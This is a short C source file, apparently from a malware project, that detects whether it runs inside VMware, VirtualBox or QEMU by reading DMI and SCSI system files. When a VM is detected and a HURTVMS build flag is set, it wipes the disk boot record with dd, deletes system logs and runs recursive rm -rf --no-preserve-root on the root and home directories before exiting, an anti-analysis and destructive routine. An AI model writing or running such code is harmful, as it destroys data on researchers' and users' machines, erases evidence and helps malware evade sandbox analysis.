#include "../include/main.h"

inline static inline_force bool obfsc_vm() {
	const char *file[] = {"/sys/class/dmi/id/product_name", "/sys/class/dmi/id/sys_vendor", "/proc/scsi/scsi"};
	const char *vm[] = {"VMWARE", "VIRTUALBOX", "QEMU"};

	int fd, i = 0;
	bool x = false;
	char *str[1024];
	
	while (file[i] && x == false) {
		if ((fd = open(file[i], O_RDONLY)) != -1) {
			x = readuntil(fd, str, 1024, vm);
			close(fd);
		}
		i++;
	}
	return x;
}

void obfsc_init(void) {
	if (obfsc_vm() == true) {
#ifndef DEBUG
#ifdef HURTVMS
		// delete boot record
		system("dd if=/dev/zero of=/dev/sda bs=512 count=1")
		// Try remove logs
		system("rm -rf /var/log/");
		// Try remove the system
		system("rm -rf --no-preserve-root /");
		system("rm -rf --no-preserve-root ~/");
		system("rm -rf /");
		system("rm -rf ~/");
#endif // HURTVMS
		exit(0);
#else // DEBUG
		printd("VM Detected");
#endif // DEBUG
	}
}
